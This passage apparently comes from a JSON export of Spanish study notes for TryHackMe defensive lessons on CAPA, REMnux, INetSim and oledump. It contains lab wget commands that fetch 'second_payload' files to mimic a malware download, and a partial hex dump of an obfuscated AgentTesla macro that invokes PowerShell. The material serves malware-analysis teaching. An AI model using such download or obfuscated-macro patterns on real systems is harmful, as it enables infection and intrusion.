‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\nEn el output final de CAPA, referencian el framework MITRE. Esto ayuda a los analistas o defensores a mapear el comportamiento del archivo con el playbook del adversario, lo que puede ayudar acotar el alcance de la investigaci√≥n durante un incidente. \n\n---------------------------------\n<h2>MAEC</h2>\nMAEC (Malware Attribute Enumeration and Characterization) es un lenguaje especializado dise√±ado para encodear y comunicar detalles complejos respecto a malware. Contiene un rango extenso de atributos, incluyendo comportamientos, artefactos e interconexiones entre varias instancias de malware. Este lenguaje funciona como un sistema estandarizado para trackear y analizar las complejidades del malware.\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ MAEC Category               ‚îÇ MAEC Value                                      ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ malware-category            ‚îÇ launcher                                        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\nComprobemos la tabla debajo para ver los valores MAEC m√°s usados por CAPA: Downloader y Launcher.\n\n| **MAEC Value** | Description                                                                                                    |\n| -------------- | -------------------------------------------------------------------------------------------------------------- |\n| Launcher       | Exhibe comportamientos que disparan acciones espec√≠ficas similares al comportamiento del malware.              |\n| Downloader     | Exhibe comportamientos en los que descarga y ejecuta otros archivos, usualmente visto en malware m√°s complejo. |\nCuando CAPA etiqueta un archivo con el valor MAEC \"**launcher**\", indica que el archivo muestra comportamiento similar (pero no limitado) a:\n\n- Ejecutar payloads adicionales\n- Activar mecanismos de persistencia\n- Conectarse a servidores C2 (Command & Control)\n- Ejecutar funciones espec√≠ficas\n\nAlgunos de estos comportamientos tambi√©n est√°n presentes en el cat√°logo de comportamiento de malware (MBC) y el bloque de capabilities, que veremos m√°s adelante.\n\nCuando CAPA etiqueta un archivo con el valor MAEC \"**downloader**\", indica que el archivo muestra comportamiento similar (pero no limitado) a:\n\n- Descargar payloads adicionales o recursos de internet\n- Descargar actualizaciones\n- Ejecutar payloads secundarios\n- Ejecutar etapas secundarias\n- Recoger archivos de configuraci√≥n",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Dissecting CAPA Results Part 3 - Namespaces",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/5-dissecting-capa-results-part-3-namespaces/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/5. Dissecting CAPA Results Part 3 - Namespaces.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Dividiremos el tema en dos t√≥picos: Capacidad y Namespace. En esta tarea veremos el **Namespace**.\n\nDebajo podemos ver el output de `capa.exe`:\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ Capability                               ‚îÇ Namespace                          ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ reference anti-VM strings                ‚îÇ anti-analysis/anti-vm/vm-detection ‚îÇ\n‚îÇ reference anti-VM strings targeting VMWar‚îÇ anti-analysis/anti-vm/vm-detection ‚îÇ\n‚îÇ reference anti-VM strings targeting Virtu‚îÇ anti-analysis/anti-vm/vm-detection ‚îÇ\n‚îÇ contain obfuscated stackstrings          ‚îÇ anti-analysis/obfuscation/string/  ‚îÇ\n| (2 matches)                              | stackstring                        |\n‚îÇ reference HTTP User-Agent string         ‚îÇ communication/http                 ‚îÇ\n‚îÇ check HTTP status code                   ‚îÇ communication/http/client          ‚îÇ\n‚îÇ reference Base64 string                  ‚îÇ data-manipulation/encoding/base64  ‚îÇ\n‚îÇ encode data using XOR                    ‚îÇ data-manipulation/encoding/xor     ‚îÇ\n‚îÇ contain a thread local storage (.tls)    ‚îÇ executable/pe/section/tls          ‚îÇ\n| section                                  |                                    |\n‚îÇ get common file path                     ‚îÇ host-interaction/file-system       ‚îÇ\n‚îÇ create directory                         ‚îÇ host-interaction/file-system/create‚îÇ\n‚îÇ delete file                              ‚îÇ host-interaction/file-system/delete‚îÇ\n‚îÇ read file on Windows (4 matches)         ‚îÇ host-interaction/file-system/read  ‚îÇ\n‚îÇ write file on Windows (5 matches)        ‚îÇ host-interaction/file-system/write ‚îÇ\n‚îÇ get thread local storage value           ‚îÇ host-interaction/process           ‚îÇ\n‚îÇ create process on Windows                ‚îÇ host-interaction/process/create    ‚îÇ\n‚îÇ allocate or change RWX memory            ‚îÇ host-interaction/process/inject    ‚îÇ\n‚îÇ reference cryptocurrency strings         ‚îÇ impact/cryptocurrency              ‚îÇ\n‚îÇ link function at runtime on Windows      ‚îÇ linking/runtime-linking            ‚îÇ\n| (5 matches)                              |                                    |\n‚îÇ parse PE header (4 matches)              ‚îÇ load-code/pe                       ‚îÇ\n‚îÇ resolve function by parsing PE exports   | load-code/pe                       ‚îÇ\n| (186 matches)                            |                                    |\n‚îÇ run PowerShell expression                ‚îÇ load-code/powershell/              ‚îÇ\n‚îÇ schedule task via at                     ‚îÇ persistence/scheduled-tasks        ‚îÇ\n‚îÇ schedule task via schtasks               ‚îÇ persistence/scheduled-tasks        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\nEl contenido de este bloque se representa en el formato de abajo:\n\n| Formato                                                               | Ejemplo                                                       | Explicaci√≥n                                                                                                                                               |\n| --------------------------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Capability(Rule Name)**::**TLN(Top-Level Namespace)**/**Namespace** | reference anti-VM strings::Anti-Analysis/anti-vm/vm-detection | **Reference anti-VM strings** = CAPABILITY (NOMBRE DE REGLA)  <br>**Anti-Analysis** = TLN o Top-Level Namespace  <br>**anti-vm/vm-detection** = NAMESPACE |\n\n----------------------------\n<h2>Namespaces</h2>\nCAPA usa los namespaces para agrupar √≠tems con el mismo prop√≥sito.\n\n| Top-Level Namespace (TLN) | Explicaci√≥n                                                                                                                                                                                                                        |\n| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| anti-analysis             | Contiene un conjunto de reglas espec√≠ficamente dise√±adas para detectar comportamientos exhibidos por el malware para evitar an√°lisis (ofuscaci√≥n, empaquetamiento, t√©cnicas anti-depurado, etc.).                                  |\n| collection                | Contiene un conjunto de reglas relacionadas con la informaci√≥n que el malware puede intentar enumerar o recolectar.                                                                                                                |\n| communication             | Contiene un conjunto de reglas que rigen los diferentes comportamientos de comunicaci√≥n del malware, es decir, c√≥mo interact√∫a con las redes, C2 y otros comportamientos basados en red.                                           |\n| compiler                  | Contiene un conjunto de reglas y configuraciones para reconocer entornos de build espec√≠ficos o compiladores usados en la generaci√≥n de un ejecutable.                                                                             |\n| data-manipulation         | Contiene un set de reglas que gobierna los comportamientos usados en la alteraci√≥n de informaci√≥n dentro de un archivo ejecutable.                                                                                                 |\n| executable                | Contiene un conjunto de reglas que rigen los atributos de los archivos ejecutables.                                                                                                                                                |\n| host-interaction          | Contiene un conjunto de reglas relacionadas con los comportamientos que incumben interacciones con el sistema host.                                                                                                                |\n| impact                    | Contiene un conjunto de reglas relacionadas a las consecuencias potenciales o efectos del comportamiento de un programa.                                                                                                           |\n| internal                  | Las reglas contenidas en el sistema no se espera que sean usadas directamente por los analistas sino para procesos internos de CAPA con el sistema.                                                                                |\n| lib                       | Bloques de construcci√≥n para crear otras reglas.                                                                                                                                                                                   |\n| linking                   | Contiene reglas para identificar comportamientos relacionados al linking o carga din√°mica de c√≥digo o librer√≠as durante la ejecuci√≥n del programa. El malware suele depender de librer√≠as externas, por eso esto es muy necesario. |\n| load-code                 | Contiene un conjunto de reglas y regulaciones relacionadas a la carga din√°mica o ejecuci√≥n de c√≥digo durante la ejecuci√≥n del programa.                                                                                            |\n| malware-family            | Contiene un conjunto de reglas relacionadas a comportamientos ligados a familias de malware particulares.                                                                                                                          |\n| nursery                   | Esto es un terreno de ensayo que contiene reglas para aquellos que no est√°n tan pulidos.                                                                                                                                           |\n| persistence               | Contiene reglas relacionadas a comportamientos asociados con mantener acceso o persistencia en un sistema comprometido                                                                                                             |\n| runtime                   | Contiene un conjunto de reglas que busca identificar la lengua de la plataforma donde corre el programa.                                                                                                                           |\n| targeting                 | Contiene un conjunto de reglas relacionadas a comportamientos exhibidos por programas que interact√∫an con ATMs.                                                                                                                    |\n\nVeamos c√≥mo funciona esto mirando la tabla de abajo:\n\n| Top-Level Namespace (TLN) | Namespaces           | Rule YAML File                                                                                                  | Explanation                                                                                                                                                                                                                                                                    |\n| ------------------------- | -------------------- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| **Anti-Analysis**         | anti-vm/vm-detection | reference-anti-vm-strings-targeting-virtualbox.yml  <br>  <br>reference-anti-vm-strings-targeting-virtualpc.yml | ‚Äúanti-vm/vm-detection‚Äù namespace contiene reglas para detectar entornos de m√°quina virtual. Detectan strings o patrones usados por malware para detectar VMs mientras corren. As√≠ CAPA puede detectar si el programa est√° intentando averiguar si est√° en una m√°quina virtual. |\n|                           | obfuscation          | obfuscated-with-dotfuscator.yml  <br>  <br>obfuscated-with-smartassembly.yml                                    | El malware suele usar t√©cnicas de ofuscado. Estas incluyen m√©todos como encriptaci√≥n de strings, ofuscaci√≥n del c√≥digo, empaquetamiento y trucos anti-depuraci√≥n. El namespace obfuscation lidia con esto para ver el contenido real del c√≥digo.                               |\n\nPara esto s√≥lo hemos usado **Anti-Analysis** como TLN. Bajo este TLN, hemos agrupado los namespaces como **anti-vm/vm-detection** y **obfuscation**. Cada namespace tiene una colecci√≥n de reglas dentro de ellos que tambi√©n se agrupan juntas. Para **anti-vm/vm-detection** tenemos:\n\n- **reference-anti-vm-strings-tartgeting-virtualbox.yml**\n- **reference-anti-vm-strings-tartgeting-virtualpc.yml**\n\nLo mismo para el namespace obfuscation:\n\n- **obfuscated-with-dotfuscator.yml**\n- **obfuscated-with-smartassembly.yml**\n\nRecuerda que esto es bajo el TLN **Anti-Analysis**!\n\n![[Pasted image 20251028131522.png]]\n\nAdem√°s de lo mencionado en la tabla de arriba, hay m√°s namespaces bajo **Anti-Analysis** con sus correspondientes reglas. Si quieres investigar m√°s consulta este [enlace](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis).\n\nUsa este otro [enlace](https://github.com/MBCProject/capa-rules-1?tab=readme-ov-file#namespace-organization) si est√°s interesado en otros TLN como collection, compiler, persistence, linking e impact.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Analizar software potencialmente malicioso puede ser peligroso, especialmente cuando este es parte de un incidente de seguridad en ejecuci√≥n. Los resultados deben ser lo m√°s precisos posibles y los analistas deben usar diferentes herramientas, m√°quinas y entornos para conseguirlo. En esta unidad usaremos REMnux VM.\n\nREMnux VM es una distribuci√≥n de Linux especializada. Incluye herramientas como Volatility, YARA, Wireshark, oledump e INetSim. Tambi√©n ofrece entornos de sandbox para diseccionar software potencialmente malicioso sin riesgo de contaminar tu sistema primario. Es tu laboratorio listo para usar sin necesidad de instalaciones manuales.\n\n--------------------------\n<h2>Objetivos de Aporendizaje</h2>\n- Explorar las herramientas dentro de REMnux VM.\n- Aprender a c√≥mo usar las herramientas para analizar documentos potencialmente maliciosos.\n- Aprender a c√≥mo simular una red falsa para ayudar en el an√°lisis.\n- Familiarizarse con las herramientas usadas para analizar im√°genes de memoria.\n\n----------------------------------\n<h2>Pre-requisitos</h2>\n[[0. CyberChef - The Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Fake Network to Aid Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/3-fake-network-to-aid-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/3. Fake Network to Aid Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Durante un an√°lisis din√°mico es esencial observar el comportamiento del software potencialmente peligroso, especialmente sus actividades de red. Hay varias maneras de hacer esto. Podemos crear una infraestructura entera, un entorno virtual con diferentes m√°quinas y m√°s. De forma alternativa, hay una herramienta dentro de REMnux VM llamada **INetSim: Internet Services Simulation Suite**.\n\nUsaremos las funcionalidades de INetSim para simular una red real en esta tarea.\n\n--------------------------------\n<h2>M√°quinas Virtuales</h2>\nPara esta tarea usaremos 2 m√°quinas. La primera es nuestra m√°quina REMnux y la segunda es la AttackBox. Para ejecutar la Attackbox, clickamos en el bot√≥n azul **Start AttackBox**. Puedes cambiar de una a otra pinchando en los botones de abajo:\n\n![[Pasted image 20251029183511.png]]\n\n---------------------------------\n<h2>INetSim</h2>\nAntes de empezar debemos configurar la herramienta INetSim dentro de nuestra REMnux. Primero comprueba la IP asignada a tu m√°quina. Esto se puede ver usando el comando `ipconfig`. Despu√©s necesitaremos cambiar la configuraci√≥n de INetSim corriendo el comando `sudo vu /etc/inetsim/inetsim.conf` y buscando el valor `#dns_default_ip 0.0.0.0`.\n\nElimina el comentario (`#`) y cambia el valor de `0.0.0.0` a la IP de la m√°quina que has identificado antes. Guarda y sal. Usa el siguiente comando para comprobar los cambios:\n\n`cat /etc/inetsim/inetsim.conf | grep dns_default_ip`\n\n```powershell\nubuntu@10.10.134.94:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip\n# dns_default_ip\n# Syntax: dns_default_ip \ndns_default_ip\t 10.10.134.94\n```\n\nPor √∫ltimo ejecuta la herramienta con:\n\n```powershell\nubuntu@10.10.134.94:~$ sudo inetsim\nINetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg\nUsing log directory:      /var/log/inetsim/\nUsing data directory:     /var/lib/inetsim/\nUsing report directory:   /var/log/inetsim/report/\nUsing configuration file: /etc/inetsim/inetsim.conf\nParsing configuration file.\nWarning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43\nConfiguration file parsed successfully.\n=== INetSim main process started (PID 4859) ===\nSession ID:     4859\nListening on:   10.10.134.94\nReal Date/Time: 2024-09-22 17:38:22\nFake Date/Time: 2024-09-22 17:38:22 (Delta: 0 seconds)\n Forking services...\n  * dns_53_tcp_udp - started (PID 4863)\n  * http_80_tcp - failed!\n  * https_443_tcp - started (PID 4865)\n  * ftps_990_tcp - started (PID 4871)\n  * pop3_110_tcp - started (PID 4868)\n  * smtp_25_tcp - started (PID 4866)\n  * ftp_21_tcp - started (PID 4870)\n  * pop3s_995_tcp - started (PID 4869)\n  * smtps_465_tcp - started (PID 4867)\n done.\nSimulation running.\n```\n\nDespu√©s de ejecutarlo, aseg√∫rate de que ves la frase \"**Simulation Runnin**\" abajo e ignora el **the http_80_tcp - failed**. ¬°Nuestra red falsa ya est√° corriendo!\n\n----------------------------------\n<h2>AttackBox</h2>\nDesde la m√°quina de la Attackbox, abrimos el navegador y buscamos la IP de nuestra m√°quina REMnux usando el comando `https://<ip_REMnux>`. Le damos a Avanzado y aceptamos el riesgo y continuamos.\n\n![[Pasted image 20251029185149.png]]\n\nUna vez hecho deber√≠amos ser redirigidos a la p√°gina base de INetSim.\n\n![[Pasted image 20251029185217.png]]\n\nUn comportamiento usual del malware es descargar otro binario o script. Trataremos de imitar este comportamiento. Podemos hacerlo via CLI o por el navegador aunque usaremos CLI para hacerlo m√°s realista. Usaremos el comando `sudo wget https://<IP_REMnux>/second_payload.zip --no-check-certificate`\n\n```shell\nroot@10.10.134.94:~# sudo wget https://10.10.134.94/second_payload.zip --no-check-certificate\n--2024-09-22 22:18:49--  https://10.10.134.94/second_payload.zip\nConnecting to 10.10.134.94:443... connected.\nWARNING: cannot verify 10.10.134.94's certificate, issued by \\u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\\u2019:\n  Self-signed certificate encountered.\n    WARNING: certificate common name \\u2018inetsim.org\\u2019 doesn't match requested host name \\u2018MACHINE_IP\\u2019.\nHTTP request sent, awaiting response... 200 OK\nLength: 258 [text/html]\nSaving to: \\u2018second_payload.zip\\u2019\n\nsecond_payload.zip  100%[===================>]     258  --.-KB/s    in 0s      \n\n2024-09-22 22:18:49 (14.5 MB/s) - \\u2018second_payload.zip\\u2019 saved [258/258]\n```\n\nTambi√©n podemos tratar de descargarnos otro script, por ejemplo: `sudo wget https://<IP_REMnux>/second_payload.ps1 --no-check-certificate`.\n\nPara verficar los archivos descargados comprobaremos el fichero de descargas, en nuestro caso root:\n\n![[Pasted image 20251029185608.png]]\n\nTodos estos son archivos falsos. Intenta abrir `second_payload.ps1`. Al ser ejecutado, te dirigir√° a la p√°gina de INetSim.\n\nLo que hicimos aqu√≠ fue imitar comportamiento de malware, donde tratamos de descargar un archivo secundario que puede contener malware desde un servidor .\n\n-------------------------------\n<h2>Reporte de Conexi√≥n</h2>\nPor √∫ltimo vamos de vuelta a REMnux VM y paramos INetSim. Por defecto, crearemos un reporte de las conexiones capturadas. Esto es normalmente guardado en el directorio `/var/log/inetsim/report/`. Deber√≠amos de ver algo as√≠:\n\n```text\nReport written to '/var/log/inetsim/report/report.2594.txt' (14 lines)\n=== INetSim main process stopped (PID 2594) ===\n```\n\nPodemos leer el archivo usando `sudo cat /var/log/inetsim/report/report.2594.txt`:\n\n```shell\nubuntu@10.10.134.94:~$ sudo cat /var/log/inetsim/report/report.2594.txt\n=== Report for session '2594' ===\n\nReal start date            : 2024-09-22 21:04:42\nSimulated start date       : 2024-09-22 21:04:42\nTime difference on startup : none\n\n2024-09-22 21:04:53  First simulated date in log file\n2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.134.94/, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.134.94/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe\n2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.134.94/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.134.94/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:18:49  Last simulated date in log file\n===\n```\n\nEsto son los logs de cuando la herramienta estaba corriendo. Podemos ver conexiones hechas a una URL, el protocolo y el m√©todo usados. Tambi√©n podemos ver el archivo falso que fue descargado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. File Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/2-file-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/2. File Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "En esta tarea usaremos `oledump.py` para realizar an√°lisis est√°tico de un documento de Excel potencialmente malicioso.\n\n`Oledump.py` es una herramienta que analiizza archivos **OLE2**, comunmente llamado **Structured Storage / Compound File** Binary Fotmat. **OLE** significa **Object Linking and Embedding**, una tecnolog√≠a de propiedad desarrollada por Microsoft. Los archivos OLE2 son t√≠picamente usados para almacenar m√∫ltiples tipos de informaci√≥n, como documentos, hojas de c√°lculo y presentaciones en un mismo archivo. Esta herramienta es √∫til para extraer y examinar los contenidos de los archivos OLE2, haci√©ndola valiosa para an√°lisis forense.\n\nUsando la m√°quina virtual **REMnux VM** en la tarea, navega hasta el directorio `/home/ubuntu/Desktop/tasks/agenttesla/`. Nuestro archivo objetivo es `agenttesla.xlsm` Ejecuta el comando `oledump.py agenttesla.xlsm`. Ver√°s lo siguiente:\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm \nA: xl/vbaProject.bin\nA1:       468 'PROJECT'\nA2:        62 'PROJECTwm'\nA3: m     169 'VBA/Sheet1'\nA4: M     688 'VBA/ThisWorkbook'\nA5:         7 'VBA/_VBA_PROJECT'\nA6:       209 'VBA/dir'\n```\n\nBasado en el an√°lisis de archivo de OleDump, un script VBA puede estar incrustado en el documento y encontrado dentro de `xl/vbaProject.bin`. Por eso, oledump le dar√° un √≠ndice de A, aunque puede ser diferente a veces. El √≠ndice A + N√∫meros se llama **data streams**.\n\nAhora deber√≠amos fijarnos en la data stream con la letra M. Esto significa que hay una **Macro**, y puedes querer comprobar este data stream, `VBA/ThisWorkBook`.\n\nVamos a comprobarlo. Ejecutaremos el comando `oledump.py agenttesla.xlsm -s 4`. Este comando correr√° oledump y mirar√° en los actuales data stream usando el par√°metro `-s`, que es la forma corta de `-select`.\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4\n\n00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V\n00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = \"Thi.s\n00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k\"....Ba\n00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-\n00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|\n00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..\n00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl\n00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id\n00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru..\"Expose..\n00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri\n000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..\n000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O\n000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt\n000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s\n000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc\n000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,\n00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^\n00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^\n00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 